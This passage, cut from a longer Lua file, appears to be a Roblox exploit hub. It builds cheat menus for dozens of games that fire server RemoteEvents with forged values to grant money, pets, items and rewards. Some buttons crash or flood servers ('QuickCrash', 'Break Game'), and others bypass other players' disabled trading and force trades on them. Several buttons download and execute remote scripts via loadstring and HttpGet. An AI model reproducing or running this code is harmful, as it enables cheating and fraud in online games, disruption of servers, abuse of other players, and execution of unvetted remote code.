        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2723.70044, 140.232941, 515.602234, 0.631954789, -0.151853248, -0.759982765, 0.578600049, 0.744848609, 0.332298845, 0.51561147, -0.649723887, 0.558572948)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2273.19141, 159.28598, 359.098297, -0.0923259258, 0.541163802, -0.83583349, -0.140492842, 0.82394141, 0.548983037, 0.985767543, 0.168114021, -4.14848328e-05)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2922.73218, 245.187836, 347.579437, -0.0501396656, 0, -0.998742163, 0, 1, 0, 0.998742163, 0, -0.0501396656)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2083.13184, 171.586182, 543.775024, -0.711478353, 0, -0.702708066, 0, 1, 0, 0.702708066, 0, -0.711478353)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2528.88062, 100.91748, 501.91748, -0.238877892, 0.489428699, -0.838687658, -0.0249191523, 0.860317707, 0.509148836, 0.970729828, 0.14252378, -0.193314672)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2583.37793, 112.563072, 554.459229, -0.99855423, 0, 0.05375918, 0, 1, 0, -0.05375918, 0, -0.99855423)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2641.78394, 86.5, 309.783875, 0.994300961, 0.014680529, 0.105594218, -0.0134198256, 0.999830067, -0.012639788, -0.105761826, 0.0111506963, 0.994328976)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2738.94458, 135.067657, 379.401733, 0.860451758, -0.0288628861, 0.508713841, 0.110712625, 0.985131919, -0.131368786, -0.497358561, 0.169357538, 0.85085398)
        wait(0.001)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2680.90771, 136.654449, 413.513184, 0.955782771, -0, -0.294073611, 0, 1, -0, 0.294073611, 0, 0.955782771)
    end)
end

if game.PlaceId == 10541365934 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewTextBox("Give Pet", "Vry OP", function(GivePett)
    local args = {
        [1] = GivePett
    }
    game:GetService("ReplicatedStorage").GivePet:FireServer(unpack(args))
    end)
end

if game.PlaceId == 7070810903 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoCry", "Vry OP", function()
        autocry = true
        while autocry == true do
            wait(0.06)
            timer = 0
            repeat
                local args = {
                    [1] = true
                }
                game:GetService("ReplicatedStorage").RemoteEvents.ManageCrying:FireServer(unpack(args))
                timer = timer + 1
            until timer == 5
        end
    end)

    MainSection:NewButton("AutoDrink", "Vry OP", function()
        aurodrink = true
        while autodrink == true do
            wait(0.1)
            local args = {
                [1] = true
            }
            game:GetService("ReplicatedStorage").RemoteEvents.ManageCrying:FireServer(unpack(args))
        end
    end)

    MainSection:NewButton("StopCry", "Vry OP", function()
        autocry = false
    end)

    MainSection:NewButton("StopDRink", "Vry OP", function()
        autodrink = false
    end)
end

if game.PlaceId == 8084034728 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewDropdown("SelectItem", "Select a item for below", {"Nuke", "Gift", "SpeedChanger", "JumpChanger", "x2Speed", "x2Jump"}, function(Item)
        Fixitem = Item
    end)
    
    MainSection:NewTextBox("Price", "(Gems) Also buys item", function(GemsPrice)
        location = game:GetService("ReplicatedStorage").Shop[Fixitem]
        GemsPriceAsInt = tonumber(GemsPrice)
    local args = {
        [1] = "Gems",
        [2] = GemsPriceAsInt,
        [3] = location
    }
    game:GetService("ReplicatedStorage").ShopEvent:FireServer(unpack(args))
    end)
end

if game.PlaceId == 8230149084 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewDropdown("SelectItem", "Select a item for below", {"Nuke", "Gift", "SpeedChanger", "Reset"}, function(Item)
        Fixitem = Item
    end)
    
    MainSection:NewTextBox("Price", "(Gems) Also buys item", function(GemsPrice)
        location = game:GetService("ReplicatedStorage").Shop[Fixitem]
        GemsPriceAsInt = tonumber(GemsPrice)
    local args = {
        [1] = "Gems",
        [2] = GemsPriceAsInt,
        [3] = location
    }
    game:GetService("ReplicatedStorage").ShopEvent:FireServer(unpack(args))
    end)
end

if game.PlaceId == 9524757503 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("GetAllCaptures", "VRYOP", function()
        timer = 0
        repeat
            str = "Part".. timer
            local args = {
                [1] = str
            }
            
            game:GetService("ReplicatedStorage").EvtRemoteAbsorbBeatNode:FireServer(unpack(args))
            timer = timer + 1
            wait(0.0001)
        until timer == 1000
    end)
end

if game.PlaceId == 7462526249 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("FreeUGC", "VRYOP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/2022NikeFREEUGC.lua",true))()
    end)
end

if game.PlaceId == 10085978574 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoGem", "Vry OP", function()
        AutoGems = true
        while AutoGems == true do
            wait(0.06)
            timer = 0
            repeat
                local args = {
                    [1] = {
                        ["Gibbon"] = ""
                    },
                    [2] = 1682383331.5429688
                }
                game:GetService("ReplicatedStorage").RemoteEvents.CollectibleInteraction:FireServer(unpack(args))
                timer = timer + 1
            until timer == 35
        end
    end)

    MainSection:NewButton("StopGem", "Vry OP", function()
        AutoGems = false
    end)
end

if game.PlaceId == 6711562581 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
  
    MainSection:NewTextBox("Get Money", "VRYOP", function(CarCash)
    local args = {
        [1] = "Sanctioned",
        [2] = -CarCash,
        [3] = "490256744",
        [4] = {}
    }
    game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
    end)
end

if game.PlaceId == 4898339524 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("QuickCrash", "Vry OP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/RagdollSuperBreak.lua",true))()
    end)
end

if game.PlaceId == 8188728273 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewDropdown("GetPet", "VRYOP", {"Penquin", "Puppy", "Owl", "Turtle", "Unicorn"}, function(PetToGet)
    local args = {
        [1] = game:GetService("Players").LocalPlayer,
        [2] = PetToGet,
        [3] = true
    }
    game:GetService("ReplicatedStorage").KeyBind:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 7809587478 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Get Points", "VRYOP", function(PointsGet)
    local args = {
        [1] = PointsGet
    }
    game:GetService("ReplicatedStorage").Events.AddStats:FireServer(unpack(args))
    end)
end

if game.PlaceId == 9872472334 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Respawn", "VRYOP", function()
    game:GetService("ReplicatedStorage").Events.Respawn:FireServer()
    end)
end

if game.PlaceId == 4795251564 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
LightLevel = 0
ReflectanceLevel = 0

MainSection:NewTextBox("Set Light", "VRYOP", function(LightLevel)
    local args = {
        [1] = "light_range",
        [2] = LightLevel
    }
    game:GetService("ReplicatedStorage").shared.network.network_contents.block_data_remote:InvokeServer(unpack(args))
    end)

MainSection:NewTextBox("Set Transparency", "VRYOP", function(TransparencyLevel)
    local args = {
        [1] = "transparency",
        [2] = TransparencyLevel
    }
    game:GetService("ReplicatedStorage").shared.network.network_contents.block_data_remote:InvokeServer(unpack(args))
    end)

MainSection:NewTextBox("Set reflectancy", "VRYOP", function(ReflectanceLevel)
    local args = {
        [1] = "reflectance",
        [2] = ReflectanceLevel
    }
    game:GetService("ReplicatedStorage").shared.network.network_contents.block_data_remote:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 6599894278 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoBux", "nice simple AutoBux", function()
        AutoBux = true
        while AutoBux == true do
            local args = {
                [1] = "AddBux"
            }
            game:GetService("ReplicatedStorage").RE:FireServer(unpack(args))
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoBux", "Stops AutoBux", function()
        AutoBux = false
    end)
end

if game.PlaceId == 7503115095 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("GUI - 1", "VRYOP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/PopItTradingRipoffScript.lua"))()
    end)

    MainSection:NewButton("GUI - 2", "VRYOP", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/toytradingautofarmGui.lua"))()
    end)

    MainSection:NewTextBox("ID.HoldAnyItem", "Use the ID 1000+", function(TOOLID)
        local args = {
            [1] = TOOLID
        }
        game:GetService("ReplicatedStorage").Events.PickAndDrop.TakeToolRE:FireServer(unpack(args))
    end)

    MainSection:NewDropdown("LimitedBuyItem", "Out Of Game", {"Mini_Pumpkin", "Pumpkin", "Pumpkin2", "Fire_Pumpkin", "Cursed_Pumpkin", "Void_Pumpkin", "Zombie_Pumpkin", "Ghost", "Ghost2", "Candy", "Spider", "Spider2", "Halloween_Bucket", "Halloween_Egg", "Halloween_Hat", "Snowman", "Snowman2", "Gingerbread_Man", "Rudolf", "Christmas_Tree", "Easter_Dominus", "Easter_Egg", "Fall_Leaf", "Turkey_Leg", "Turkey"}, function(LimitedItemBuy)
        if LimitedItemBuy == "Mini_Pumpkin" then
            IDBUY = 10140
        elseif LimitedItemBuy == "Candy" then
            IDBUY = 10131 
        elseif LimitedItemBuy == "Halloween_Bucket" then
            IDBUY = 10132
        elseif LimitedItemBuy == "Halloween_Egg" then
            IDBUY = 10137
        elseif LimitedItemBuy == "Fire_Pumpkin" then
            IDBUY = 10130
        elseif LimitedItemBuy == "Void_Pumpkin" then
            IDBUY = 10129
        elseif LimitedItemBuy == "Cursed_Pumpkin" then
            IDBUY = 10247
        elseif LimitedItemBuy == "Snowman" then
            IDBUY = 10188
        elseif LimitedItemBuy == "Snowman2" then
            IDBUY = 10188
        elseif LimitedItemBuy == "Gingerbread_Man" then
            IDBUY = 10191
        elseif LimitedItemBuy == "Rudolf" then
            IDBUY = 10181
        elseif LimitedItemBuy == "Christmas_Tree" then
            IDBUY = 10172 
        elseif LimitedItemBuy == "Easter_Dominus" then
            IDBUY = 10231
        elseif LimitedItemBuy == "Turkey" then
            IDBUY = 10164
        elseif LimitedItemBuy == "Fall_Leaf" then
            IDBUY = 30163
        elseif LimitedItemBuy == "Turkey_Leg" then
            IDBUY = 10166
        elseif LimitedItemBuy == "Halloween_Hat" then
            IDBUY = 10138
        elseif LimitedItemBuy == "Spider" then
            IDBUY = 10139
        elseif LimitedItemBuy == "Spider2" then
            IDBUY = 10128
        elseif LimitedItemBuy == "Pumpkin2" then
            IDBUY = 10128
        elseif LimitedItemBuy == "Pumpkin" then
            IDBUY = 10246
        elseif LimitedItemBuy == "Ghost" then
            IDBUY = 10134
        elseif LimitedItemBuy == "Ghost2" then
            IDBUY = 10135
        elseif LimitedItemBuy == "Zombie_Pumpkin" then
            IDBUY = 10136
        elseif LimitedItemBuy == "Easter_Egg" then
            IDBUY = 10223
        end
        local args = {
            [1] = "purchase",
            [2] = IDBUY,
            [3] = 1
        }
        
        game:GetService("ReplicatedStorage").Events.Coin.CoinMarketRE:FireServer(unpack(args))
    end)

    MainSection:NewDropdown("SetTitle", "Out Of Game", {"_", "TradingNoob", "TradingPro", "TradingMaster", "TradingHacker", "TheGodOfTrading", "BuisnessMan", "ToyCreator", "GoldenRule", "RainbowAddict", "2021Haloween", "2021Thanksgiving", "2021Christmas", "2022Easter", "2022Halloween"}, function(TitleName)
        if TitleName == "_" then
            IDTITLE = 0
        elseif TitleName == "TradingNoob" then
            IDTITLE = 10011
        elseif TitleName == "TradingPro" then
            IDTITLE = 10012
        elseif TitleName == "TradingMaster" then
            IDTITLE = 10013
        elseif TitleName == "TradingHacker" then
            IDTITLE = 10014
        elseif TitleName == "TheGodOfTrading" then
            IDTITLE = 10015
        elseif TitleName == "BuisnessMan" then
            IDTITLE = 10025
        elseif TitleName == "ToyCreator" then
            IDTITLE = 10035
        elseif TitleName == "GoldenRule" then
            IDTITLE = 10045
        elseif TitleName == "RainbowAddict" then
            IDTITLE = 10055
        elseif TitleName == "2021Haloween" then
            IDTITLE = 20011
        elseif TitleName == "2021Thanksgiving" then
            IDTITLE = 20021
        elseif TitleName == "2021Christmas" then
            IDTITLE = 20031
        elseif TitleName == "2022Easter" then
            IDTITLE = 20041
        elseif TitleName == "2022Haloween" then
            IDTITLE = 20051
        end
        local args = {
            [1] = "Title",
            [2] = IDTITLE
        }
        game:GetService("ReplicatedStorage").Events.Equipment.EquipmentRE:FireServer(unpack(args))
    end)

    MainSection:NewButton("AutoReward", "VRYOP", function()
        Membership = false
        VIP = false
        if game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium then
            Membership = true
        end
        if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer.UserId,23607912) then
            VIP = true
        end
        AutoReward = true
        while AutoReward == true do
            game:GetService("ReplicatedStorage").Events.Reward.ClaimRewardRE:FireServer("Free")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward1")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward2")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward3")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward4")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward5")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward6")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward7")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward8")
            game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Reward9")
            if Membership == true then
                game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Premium")
                wait(0.01)
            end
            if VIP == true then
                game:GetService("ReplicatedStorage").Events.Reward.OnlineRewardRE:FireServer("Vip")
                wait(0.01)
            end
            wait(0.3)
        end
    end)

    MainSection:NewButton("StopReward", "VRYOP", function()
        AutoReward = false
    end)
end
if game.PlaceId == 10306321397 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
    MainSection:NewDropdown("Power", "VRYOP", {"SPD++", "STR++"}, function(Powerup2Gib)
        local args = {
            [1] = Powerup2Gib
        }
        game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.PlayerStatService.RF.AwardPowerUpToPlayer:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 6875747014 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Break Game", "VRY OP", function()
        while true do 
            local args = {
            [1] = false,
            [2] = 200
            }
            game:GetService("ReplicatedStorage").functionsAndEvents.rollDice:InvokeServer(unpack(args))
        end            
    end)

    MainSection:NewButton("Out Of Jail", "VRY OP", function()
    local args = {
        [1] = false,
        [2] = 12
    }
    game:GetService("ReplicatedStorage").functionsAndEvents.doubleNotRolled:FireServer(unpack(args))           
    end)
end

if game.PlaceId == 6875747014 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Coins", "VRY OP", function()
        cointime = 0
        repeat 
            local args = {
                [1] = cointime,
                [2] = "Cozmo"
            }
            game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.6").knit.Services.CoinService.RF.RequestCoin:InvokeServer(unpack(args))
            cointime = cointime + 1
        until cointime == 26            
    end)
end

if game.PlaceId == 654732683 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Enter Heli", "VRY OP", function()
        local args = {
            [1] = "LAA",
            [2] = true,
            [3] = 1
        }
        game:GetService("ReplicatedStorage").rE.Components.Region.AllocateSeat:FireServer(unpack(args))            
    end)
end

if game.PlaceId == 4795251564 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
LightLevel = 0
ReflectanceLevel = 0

MainSection:NewTextBox("Give Item", "VRYOP", function(GiveItem)
    local args = {
        [1] = GiveItem
    }
    
    game:GetService("ReplicatedStorage").Remotes.TakeItem:FireServer(unpack(args))
    end)

MainSection:NewButton("Get Money", "VRYOP", function()
    game:GetService("ReplicatedStorage").Remotes.CCo:FireServer()
    end)
end

if game.PlaceId == 11970456 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
LightLevel = 0
ReflectanceLevel = 0

MainSection:NewButton("Ez Complete", "VRYOP", function()
    local args = {
        [1] = "ROUND_COMPLETED"
    }
    
    game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
    end)
end

if game.PlaceId == 6412231967 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("collect all trash", "VRYOP", function()
    Timer = 0
    AutofarmMethod = "Trash_Collect"
    repeat
        local args = {
            [1] = workspace.Tycoon.Tycoons.tycoon2.Trash.Trash
        }
        game:GetService("ReplicatedStorage").Remotes.CollectTrash:FireServer(unpack(args))
        wait(0.01)
        Timer = Timer + 1
    until Timer == 100
    end)
end

if game.PlaceId == 10526921593 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("TimeReward", "VRYOP", function()
        local args = {
            [1] = game:GetService("Players").LocalPlayer.Rewards.TimeReward
        }
        game:GetService("ReplicatedStorage").RemoteEvents.ClaimReward:InvokeServer(unpack(args))
    end)

MainSection:NewButton("WinReward", "VRYOP", function()
        local args = {
            [1] = game:GetService("Players").LocalPlayer.Rewards.WinReward
        }
        game:GetService("ReplicatedStorage").RemoteEvents.ClaimReward:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 6824412329 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewSlider("Equipt Tool", "VRYOP", 25, 1, function(ToolIDEquipt)
        local args = {
            [1] = "AxeId",
            [2] = 1000 ..ToolIDEquipt
        }
        game:GetService("ReplicatedStorage").Events.Equipment.EquipmentRE:FireServer(unpack(args))
    end)

MainSection:NewSlider("Equipt Back", "VRYOP", 25, 1, function(BackpackId)
        local args = {
            [1] = "AxeId",
            [2] = 1100 ..ToolIDEquipt
        }
        game:GetService("ReplicatedStorage").Events.Equipment.EquipmentRE:FireServer(unpack(args))
    end)
end

if game.PlaceId == 6708991752 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("AutoBux", "nice simple AutoBux", function()
        AutoBux = true
        while AutoBux == true do
            local args = {
                [1] = game:GetService("Players").LocalPlayer.Character,
                [2] = workspace.Tracks.NewTracks.Path.SpikesGoingDown.Coins.Coin.CoinBoundingBox,
                [3] = "CoinCollected"
            }
            
            game:GetService("ReplicatedStorage").RemoteEvents.ExecuteBehaviour:FireServer(unpack(args))            
            wait(Tick)
            end   
    end)

    MainSection:NewButton("Stop AutoBux", "Stops AutoBux", function()
        AutoBux = false
    end)
end

if game.PlaceId == 4950724851 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")
    MainSection:NewDropdown("Achievement", "VRYOP", {"Ejector Seat", "Skeeballer", "Throttle Up", "Sign Aged", "Kaboom", "Cork", "Cart Coaster", "Bounce", "I'm A Big Fan", "Beamball's Place", "Castle Crashers", "Splash", "Bullseye", "Ramp It Up", "Ace", "Whack-A-Marble!", "Wipeout Winner", "Mega Rings", "Rainbow Racers", "Pyramid Cups", "Swish Swish", "Zipper", "Beat Producer", "Ripple Effect", "Wavebreaker", "Diamond Cups", "The Hurler", "Through The Middle", "Shooting Star", "Eruption", "High Striker", "Falcon Flyer"}, function(TheAchievement)
        local args = {
            [1] = TheAchievement
        }
        game:GetService("ReplicatedStorage").shared.remotes.achievement:FireServer(unpack(args))
    end)
end

if game.PlaceId == 11166772242 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Glitch Booth Text", "OP", function()
        repeat
            GlitchText = GlitchText .."XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
            wait(0.0001)
        until Timer == 100
        local args = {
            [1] = GlitchText
        }
        game:GetService("ReplicatedStorage").Edit:FireServer(unpack(args))
    end)
end

if game.PlaceId == 15535115259 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    MainSection:NewButton("Autofarm Money", "Good", function()
        AutoMoney = true
        while AutoMoney == true do
            local LauchID = game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.6.0").knit.Services.LauncherService.RF.LaunchBegan:InvokeServer()
            local args = {
                [1] = math.huge
            }
            game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.6.0").knit.Services.LauncherService.RE.UpdateLapsCount:FireServer(unpack(args))
            local args = {
                [1] = LauchID,
                [2] = 2,
                [3] = false
            }
            game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.6.0").knit.Services.LauncherService.RF.LaunchFinished:InvokeServer(unpack(args))
            wait(SmallTick)
        end 
    end)

    MainSection:NewButton("Stop Autofarm Money", "Good", function()
        AutoMoney = false 
    end)

    MainSection:NewButton("Autofarm Stars", "Good", function()
        AutoStar = true
        while AutoStar == true do
            local args = { [1] = {} }

            for _, item in pairs(workspace:FindFirstChild("DROPS"):GetChildren()) do
                table.insert(args[1], item.Name)
            end

            game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.6.0").knit.Services.DropService.RE.PickupDrop:FireServer(unpack(args))

            for _, item in pairs(workspace:FindFirstChild("DROPS"):GetChildren()) do
                item:Destroy()
            end
            wait(1)
        end 
    end)

    MainSection:NewButton("Stop Autofarm Stars", "Good", function()
        AutoStar = false 
    end)
end

if game.PlaceId == 135328829400001 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

local elapsed = 0

    MainSection:NewButton("Delete All Pets", "Deletes all your pets", function()
        for _, item in pairs(game:GetService("Players").LocalPlayer.PlayerData.Pets:GetChildren()) do
            game:GetService("ReplicatedStorage").Main.PetDelete:FireServer(item.Name)
        end        
    end)

    MainSection:NewButton("Ghost Ride", "Rides on no pet", function()
        game:GetService("Players").LocalPlayer.PlayerData.isRiding.Value = not game:GetService("Players").LocalPlayer.PlayerData.isRiding.Value        
    end)

    MainSection:NewButton("Ghost Fly", "Flies on no pet", function()
        game:GetService("Players").LocalPlayer.PlayerData.isFlying.Value = not game:GetService("Players").LocalPlayer.PlayerData.isFlying.Value       
    end)

    MainSection:NewButton("Bypass Trading Disabled", "Lets you trade people with trading disabled", function()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer then
            player.TradingOn.Value = true
            end
        end           
    end)

    MainSection:NewButton("Frozen accept timer", "really cool", function()
        if elapsed <= 0 or elapsed > 5 then
            elapsed = 0
            while elapsed < 5 do
                game:GetService("ReplicatedStorage").GameEvents.Trades.acceptedInTrade:FireServer()
                elapsed = elapsed + 0.001
                task.wait(0.001)
            end
            elapsed = 0
        end          
    end)

    MainSection:NewTextBox("Daily Reward", "Get Daily Reward", function(Day)
        game:GetService("ReplicatedStorage").Main.DailyRewards:fireServer(tonumber(Day))
    end)


local MoneySection = Main:NewSection("Money")

local PaycheckAutoFarm = false

    MoneySection:NewButton("Paycheck Farm", "Farms Paychecks", function()
        PaycheckAutoFarm = true
        while PaycheckAutoFarm == true do
            game:GetService("ReplicatedStorage").Main.Paycheck:FireServer()
            wait(SmallTick)
        end       
    end)

    MoneySection:NewButton("Stop Paycheck Farm", "Stops Farming Paychecks", function()
        PaycheckAutoFarm = false      
    end)

local PetEditorSection = Main:NewSection("PetEditor")

local Filter = ""
local Actioner = "1: Add Pet"
local PetPicker
local PetType = 'Normal'
local modelNames = {}
local chosenPet

local function updatePetPicker()
    PetPicker:Refresh({'Loading...'})
    
    local modelNames = {}
    
    if string.sub(Actioner, 1, 1) == '1' then --Add pet
        if Filter ~= '' then
            table.insert(modelNames, Filter .." --INVALID PET--")
        end
        local petsFolder = game:GetService("ReplicatedStorage"):WaitForChild("Pets")
        for _, item in pairs(petsFolder:GetChildren()) do
            if item:IsA("Model") and (not Filter or string.find(item.Name:lower(), Filter:lower(), 1, true)) then
                table.insert(modelNames, item.Name)
            end
        end
    elseif string.sub(Actioner, 1, 1) == '2' then --Delete pet
        local playerPets = game:GetService("Players").LocalPlayer.PlayerData.Pets
        for _, item in pairs(playerPets:GetChildren()) do
            if item:IsA("Configuration") and (not Filter or string.find(item.PName.Value:lower(), Filter:lower(), 1, true)) then
                table.insert(modelNames, tostring(item.PName.Value .. " -Tags:" .. item.Name))
            end
        end
    elseif string.sub(Actioner, 1, 1) == '3' then --Spoof pet
        if Filter ~= '' then
            table.insert(modelNames, Filter .." --INVALID PET--")
        end
        local petsFolder = game:GetService("ReplicatedStorage"):WaitForChild("Pets")
        for _, item in pairs(petsFolder:GetChildren()) do
            if item:IsA("Model") and (not Filter or string.find(item.Name:lower(), Filter:lower(), 1, true)) then
                table.insert(modelNames, item.Name)
            end
        end
    elseif string.sub(Actioner, 1, 1) == '4' then --Buy Any Egg
        if Filter ~= '' then
            table.insert(modelNames, Filter .." --INVALID EGG NAME--")
        end
        local petsFolder = game:GetService("StarterGui").InterActionList
        for _, item in pairs(petsFolder:GetChildren()) do
            table.insert(modelNames, item.Name)
        end
    elseif string.sub(Actioner, 1, 1) == '5' then --Megafy / Neonify
        local petsFolder = game:GetService("Players").LocalPlayer.PlayerData.Pets
        for _, item in pairs(petsFolder:GetChildren()) do
            if #item:GetChildren() >= 4 then
                table.insert(modelNames, item.Nick.Value .. ", (".. item.Type.Value.. ")".. " |".. item.Name)
            end
        end
    elseif string.sub(Actioner, 1, 1) == '6' then --Force Trade
        local petsFolder = game:GetService("Players")
        for _, item in pairs(petsFolder:GetChildren()) do
            table.insert(modelNames, item.Name)
        end
    else
        warn("ERROR - PET PICKER: Invalid actioner state")
        return  -- Exit function early if Actioner is invalid
    end
    
    PetPicker:Refresh(modelNames)
end


local function uuid()
    return string.gsub('xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx', '[xy]', function (c)
        return string.format('%x', (c == 'x') and math.random(0, 0xf) or math.random(8, 0xb))
    end)
end

    PetEditorSection:NewDropdown("Type", "PetPicker", {'Normal', 'Neon', 'Mega'}, function(PetTypeSelected)
        PetType = PetTypeSelected
    end)

    PetEditorSection:NewDropdown("Action", "PetPicker", {'1: Add Pet (PATCHED)', '2: Delete Pet', '3: Spoof Pet', '4: Buy Any Egg', '5: Megafy or Neonify', '6: Force Trade Anyone'}, function(chosenAction)
        Actioner = chosenAction
        updatePetPicker()
    end)

    PetEditorSection:NewTextBox("Filter", "filters", function(filterChange)
        Filter = filterChange
        updatePetPicker()
    end)

    PetPicker = PetEditorSection:NewDropdown("PetPicker", "PetPicker", modelNames, function(TheChosenPet)
        chosenPet = TheChosenPet
    end)

    PetEditorSection:NewButton("Do Action", "does stuff", function()
        if string.sub(Actioner, 1, 1) == '1' then --Add pet
            local args = {
                [1] = chosenPet,
                [2] = uuid():sub(1, -1),
                [3] = 1,
                [4] = PetType,
                [5] = chosenPet
            }

            game:GetService("ReplicatedStorage").Main.PetCreate:FireServer(unpack(args))
            updatePetPicker()

        elseif string.sub(Actioner, 1, 1) == '2' then --Delete pet
            game:GetService("ReplicatedStorage").Main.PetDelete:FireServer(chosenPet:match(".*%-Tags:%s*(.*)"))
            updatePetPicker()
        elseif string.sub(Actioner, 1, 1) == '3' then --Spoof pet
            if game:GetService("Players").LocalPlayer.PlayerData.Pets:GetChildren()[1].Name ~= null then
